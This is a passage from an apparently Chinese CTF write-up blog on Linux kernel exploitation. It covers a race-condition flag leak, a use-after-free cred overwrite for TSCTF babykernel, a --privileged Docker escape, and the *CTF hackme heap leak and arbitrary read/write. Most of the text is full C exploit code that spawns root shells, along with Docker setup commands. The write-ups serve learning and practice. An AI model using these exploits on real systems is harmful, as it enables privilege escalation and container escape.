class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/baby"</span>,<span class="number">2</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x6666</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"dmesg | grep flag &gt; user.txt"</span>);</span><br><span class="line">    FILE* user_fd = fopen(<span class="string">"user.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(user_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Open error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> user_buf[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fgets(user_buf,<span class="number">0x100</span>,user_fd);</span><br><span class="line">    <span class="comment">//size_t flag_addr = *(size_t*)flag;</span></span><br><span class="line">    <span class="comment">//puts(flag);</span></span><br><span class="line">    <span class="comment">//printf("[:)]Flag_addr = %p\n",*(unsigned long long *)flag); </span></span><br><span class="line">    flag_addr = strtoull(user_buf+<span class="number">31</span>,user_buf+<span class="number">31</span>+<span class="number">0x10</span>,<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]Flag_addr = %p !!!\n"</span>,flag_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pthread_t</span> p1;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user</span> <span class="title">real_struct</span>;</span></span><br><span class="line">    <span class="keyword">char</span> test_flag[] = <span class="string">"flag&#123;111111111111111111111111111&#125;"</span>;</span><br><span class="line">    real_struct.flag = test_flag;</span><br><span class="line">    real_struct.len = <span class="number">33</span>;</span><br><span class="line">    pthread_create(&amp;p1,<span class="literal">NULL</span>,change_flag_addr,&amp;real_struct);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; times; i++)&#123;</span><br><span class="line">        real_struct.flag = test_flag;</span><br><span class="line">        ioctl(fd,<span class="number">0x1337</span>,&amp;real_struct);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    finish = <span class="number">1</span>;</span><br><span class="line">    pthread_join(p1,<span class="literal">NULL</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]Result:\n"</span>);</span><br><span class="line">    system(<span class="string">"dmesg | grep flag"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="2019TSCTF-babykernel："><a href="#2019TSCTF-babykernel：" class="headerlink" title="2019TSCTF_babykernel："></a>2019TSCTF_babykernel：</h1><h2 id="思路：-1"><a href="#思路：-1" class="headerlink" title="思路："></a>思路：</h2><p><code>cred</code>结构体前<code>0x20</code>字节数据分布，如果可以的话，改前28字节较为稳定，只改<code>uid</code>与<code>gid</code>为0貌似也可以。。。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">|uid |usage|  |suid|gid |</span><br><span class="line">|euid|sgid |  |    |egid|</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/80xg 0xffff888000025980</span><br><span class="line">0xffff888000025980:	0x000003e800000003	0x000003e8000003e8</span><br><span class="line">0xffff888000025990:	0x000003e8000003e8	0x000003e8000003e8</span><br><span class="line">0xffff8880000259a0:	0x00000000000003e8	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>创建新进程时：内核会调用：<code>prepare_cred</code>-&gt;<code>kmem_cache_alloc</code>。</p>
<p><code>kmem_cache_alloc</code>用<code>rsi</code>来传参，也就是申请的内存大小，即<code>cred</code>结构体的大小。可以写<code>demo</code>程序动态调试查看，在这道题的环境中正好为<code>0xD0</code>，与题目可控的<code>chunk</code>的大小一致。</p>
<p>题目漏洞为<code>UAF</code>，较为基础。</p>
<h2 id="exp：-8"><a href="#exp：-8" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">debug</span><span class="params">()</span></span>&#123;</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">new</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">10010</span>,index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">10086</span>,index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/tshop"</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[:(]Open error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//debug();</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">delete</span>(fd,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">delete</span>(fd,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[:)]Root now!!!"</span>);</span><br><span class="line">            system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[:(]Not root..."</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Fork error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">delete</span>(fd,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">new</span>(fd,<span class="number">3</span>);</span><br><span class="line">        sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/13/YEdJjn95oa31Tpm.png" alt="x1.PNG"></p>
<h1 id="2019云安全线下rw-docker："><a href="#2019云安全线下rw-docker：" class="headerlink" title="2019云安全线下rw_docker："></a>2019云安全线下rw_docker：</h1><p>唉，这道题想想都难受，这么简单的一题。。。当时却因为种种原因混杂导致没能做出来，甚至都没静下心去看。</p>
<p>虽然表面上是个<code>Escape</code>，但实际上就是个极其简单的<code>kernel</code>，只不过利用了<code>docker run</code>时带<code>--privileged</code>参数。</p>
<h2 id="–privileged"><a href="#–privileged" class="headerlink" title="–privileged"></a>–privileged</h2><blockquote>
<p>大约在0.6版，privileged被引入docker。<br>使用该参数，container内的root拥有真正的root权限。<br>否则，container内的root只是外部的一个普通用户权限。<br>privileged启动的容器，可以看到很多host上的设备，并且可以执行mount。<br>甚至允许你在docker容器中启动docker容器。</p>
</blockquote>
<p>所以当我们在<code>docker</code>中运行<code>exp</code>达到提权成功时，等于获得了主机的<code>root</code>，也就可以弹出主机的计算器，也就相当于逃逸成功了。</p>
<p>进入宿主机，加载漏洞模块，将宿主机的23端口映射到<code>docker</code>的22端口。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo insmod /home/b/de.ko</span><br><span class="line">sudo docker run -itd --privileged -p 127.0.0.1:23:22 d77241e92fe6 /bin/bash -c <span class="string">"/etc/init.d/ssh start;/bin/bash"</span></span><br></pre></td></tr></table></figure>
<p>ssh试一下是否映射成功：</p>
<p><code>ssh root@127.0.0.1 -p23</code>，若输入密码后可以进入<code>docker</code>则说明映射成功。</p>
<p>接着写好exp，将exp复制到<code>docker</code>中。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P 23 ./myexp root@127.0.0.1:/home</span><br></pre></td></tr></table></figure>
<p>接着<code>ssh</code>进入docker，来到<code>/home</code>目录下运行复制来的<code>exp</code>，看到宿主机弹出计算器就算成功了。</p>
<p><img src="https://i.loli.net/2020/02/12/VG2IENot4lTvM7L.png" alt="x1.PNG"></p>
<p>至于题目本身。。。emm，我觉得正常人在平稳心态状态下学半天<code>kernel</code>基础知识就可以解出。</p>
<h2 id="exp：-9"><a href="#exp：-9" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/de"</span>,<span class="number">2</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    memset(buf,'\x00',0x10);</span><br><span class="line"></span><br><span class="line">    buf[0] = '\xFE'; </span><br><span class="line">    write(fd,buf,<span class="number">10</span>);</span><br><span class="line">    </span><br><span class="line">    buf[0] = '\xFD';</span><br><span class="line">    write(fd,buf,<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="另一种解法："><a href="#另一种解法：" class="headerlink" title="另一种解法："></a>另一种解法：</h2><p>挂载磁盘，修改<code>/etc/crontab</code>文件：</p>
<p><a href="https://ama2in9.top/2019/12/12/docker_escape/" target="_blank" rel="noopener">https://ama2in9.top/2019/12/12/docker_escape/</a></p>
<h1 id="2019-CTF-hackme"><a href="#2019-CTF-hackme" class="headerlink" title="2019*CTF_hackme"></a>2019*CTF_hackme</h1><h2 id="初始解法："><a href="#初始解法：" class="headerlink" title="初始解法："></a>初始解法：</h2><p>算是自己独立做出来的第一道非水题<code>kernel</code>，提权用的方法是传统的修改<code>cred</code>结构体的方法。</p>
<p><img src="https://i.loli.net/2020/02/13/RW1KeXFnG3y2UBZ.png" alt="x1.PNG"></p>
<p>需要注意的是这题给的<code>kernel</code>中貌似没有<code>security_task_prctl</code>。</p>
<h2 id="exp：-10"><a href="#exp：-10" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> index;</span><br><span class="line">    <span class="keyword">char</span>* buf;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> offset;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>* <span class="title">user_chunk</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uread</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size,<span class="keyword">long</span> <span class="keyword">long</span> offset)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    user_chunk-&gt;offset = offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30003</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uwrite</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size,<span class="keyword">long</span> <span class="keyword">long</span> offset)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    user_chunk-&gt;offset = offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30002</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">new</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size,<span class="keyword">long</span> <span class="keyword">long</span> offset)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    user_chunk-&gt;offset = offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30000</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size,<span class="keyword">long</span> <span class="keyword">long</span> offset)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    user_chunk-&gt;offset = offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30001</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/hackme"</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span> )&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[:(]Open error...\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    user_chunk = (struct chunk*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct chunk));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'0'</span>,<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">0</span>,buf,<span class="number">0x100</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'1'</span>,<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">1</span>,buf,<span class="number">0x100</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'2'</span>,<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">2</span>,buf,<span class="number">0x100</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    uread(fd,<span class="number">0</span>,buf,<span class="number">0x200</span>,<span class="number">-0x200</span>);</span><br><span class="line">    <span class="keyword">size_t</span> kernel_base = *((<span class="keyword">size_t</span>*)buf+<span class="number">5</span>) - <span class="number">0x849ae0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]kernel_base = %p\n"</span>,kernel_base);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>(fd,<span class="number">0</span>,buf,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">delete</span>(fd,<span class="number">1</span>,buf,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    uread(fd,<span class="number">2</span>,buf,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">    <span class="keyword">size_t</span> heap_base = *(<span class="keyword">size_t</span>*)buf - <span class="number">0x17a500</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]heap_base = %p\n"</span>,heap_base);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf = kernel_base + <span class="number">0x811040</span>;</span><br><span class="line">    uwrite(fd,<span class="number">2</span>,buf,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line"></span><br><span class="line">    memset(buf,'\x00',0x100);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">0</span>,buf,<span class="number">0x100</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">1</span>,buf,<span class="number">0x100</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    uread(fd,<span class="number">1</span>,buf,<span class="number">0x20</span>,<span class="number">-0x20</span>);</span><br><span class="line">    <span class="keyword">size_t</span> mod_base = *(<span class="keyword">size_t</span>*)buf - <span class="number">0x6000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]mod_base = %p\n"</span>,mod_base);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>(fd,<span class="number">0</span>,buf,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">size_t</span>*)buf = mod_base+<span class="number">0x2440</span>;</span><br><span class="line">    uwrite(fd,<span class="number">2</span>,buf,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line"></span><br><span class="line">    memset(buf,'\x00',0x100);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">0</span>,buf,<span class="number">0x100</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">3</span>,buf,<span class="number">0x100</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    prctl(PR_SET_NAME,<span class="string">"xiaoxiaorenwu.."</span>);</span><br><span class="line">    <span class="keyword">size_t</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> cred_addr;</span><br><span class="line">    <span class="keyword">size_t</span> real_cred_addr;</span><br><span class="line">    <span class="keyword">size_t</span> target_addr;</span><br><span class="line">    <span class="keyword">size_t</span> task_struct_addr;</span><br><span class="line">    <span class="keyword">char</span>* buf1 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> addr=heap_base;addr&lt;<span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">        *(<span class="keyword">size_t</span>*)buf = addr;</span><br><span class="line">        *((<span class="keyword">size_t</span>*)buf+<span class="number">1</span>) = <span class="number">0x1000</span>;</span><br><span class="line">        uwrite(fd,<span class="number">3</span>,buf,<span class="number">0x10</span>,<span class="number">0</span>);</span><br><span class="line">        uread(fd,<span class="number">4</span>,buf1,<span class="number">0x1000</span>,<span class="number">0</span>);</span><br><span class="line">        result = memmem(buf1,<span class="number">0x1000</span>,<span class="string">"xiaoxiaorenwu.."</span>,<span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">if</span>(result)&#123;</span><br><span class="line">            cred_addr = *(<span class="keyword">size_t</span>*)(result<span class="number">-8</span>);</span><br><span class="line">            real_cred_addr = *(<span class="keyword">size_t</span>*)(result<span class="number">-0x10</span>);</span><br><span class="line">            <span class="keyword">if</span>(cred_addr == real_cred_addr)&#123;</span><br><span class="line">			   target_addr = addr + (result-(<span class="keyword">size_t</span>)buf1);</span><br><span class="line">                task_struct_addr = target_addr - <span class="number">0x9a8</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"[:)]task_struct_addr = %p\n"</span>,task_struct_addr);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"[:)]find cred_addr = %p\n"</span>,cred_addr);</span><br><span class="line">                <span class="built_in">free</span>(buf1);</span><br><span class="line">                buf1 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            